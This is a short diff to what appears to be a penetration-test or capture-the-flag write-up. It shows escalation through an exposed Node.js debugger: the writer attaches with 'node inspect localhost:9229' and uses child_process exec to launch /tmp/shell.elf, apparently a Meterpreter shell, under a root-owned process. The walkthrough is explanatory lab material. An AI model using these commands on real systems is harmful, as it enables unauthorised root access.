@@ -195,12 +195,12 @@ root        1379  0.0  1.3 1068608 51500 ?       Ssl  Jun02   0:05 /usr/bin/node
 
 
 We find that you can connect to the node process using node inspect localhost:9229 on the victim host. 
-
 Since we are in ssh, we can close our Meterpreter session and start a new one, no changes needed. 
 
 We then execute the following:
 
 ```
+node inspect localhost:9229
 debug> exec("process.mainModule.require('child_process').exec('/tmp/shell.elf')")
 ```
 
